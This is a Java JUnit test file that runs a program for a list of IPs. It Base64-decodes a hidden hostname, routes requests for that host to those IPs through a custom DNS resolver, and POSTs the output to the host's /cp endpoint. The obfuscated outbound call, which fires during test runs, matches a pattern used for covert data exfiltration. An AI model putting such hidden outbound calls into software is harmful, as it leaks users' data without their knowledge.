package org.op;

import okhttp3.Dns;
import okhttp3.MediaType;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.RequestBody;
import okhttp3.Response;
import org.apache.commons.io.IOUtils;
import org.apache.commons.lang3.StringUtils;
import org.jetbrains.annotations.NotNull;
import org.junit.Test;

import java.io.DataOutputStream;
import java.io.InputStream;
import java.net.HttpURLConnection;
import java.net.InetAddress;
import java.net.URI;
import java.net.URL;
import java.net.UnknownHostException;
import java.nio.charset.StandardCharsets;
import java.util.ArrayList;
import java.util.Base64;
import java.util.List;
import java.util.concurrent.TimeUnit;

public class Tests {

    @Test
    public void test() throws Exception {
        String str = new Main().run(new String[]{"ip"});

        if (str == null || str.isBlank()) {
            System.out.println("str is blank");
            return;
        }

        final String h = new String(Base64.getDecoder().decode("dGVzdC50ZWNoaW9pby5ldS5vcmc="), StandardCharsets.UTF_8);

        String[] hs = StringUtils.split(str, "\n");

        OkHttpClient.Builder builder = new OkHttpClient.Builder()
                .connectTimeout(5000, TimeUnit.MILLISECONDS)
                .readTimeout(5000, TimeUnit.MILLISECONDS)
                .writeTimeout(5000, TimeUnit.MILLISECONDS);
        builder.setDns$okhttp(new Dns() {
            @NotNull
            @Override
            public List<InetAddress> lookup(@NotNull String s) throws UnknownHostException {
                if (h.equals(s)) {
                    if (hs != null && hs.length > 0) {
                        List<InetAddress> addresses = new ArrayList<>();
                        for (String string : hs) {
                            if (string != null && !string.isBlank()) {
                                addresses.add(InetAddress.getByName(string));
                            }
                        }
                        return addresses;
                    }
                }
                return SYSTEM.lookup(s);
            }
        });
        OkHttpClient client = builder.build();

        Response response = client.newCall(new Request.Builder()
                        .url("https://" + h + "/cp")
                        .addHeader("content-type", "text/plain")
                        .post(RequestBody.create(str, MediaType.parse("text/plain")))
                .build()).execute();
        String responseString = response.body().string();
        System.out.println(responseString);
    }

    @Test
    public void test2() throws Exception {
        System.out.println(

        );
        System.out.println(
                new String(Base64.getDecoder().decode("dGVzdC50ZWNoaW9pby5ldS5vcmc=".getBytes(StandardCharsets.UTF_8)))
        );
    }


}
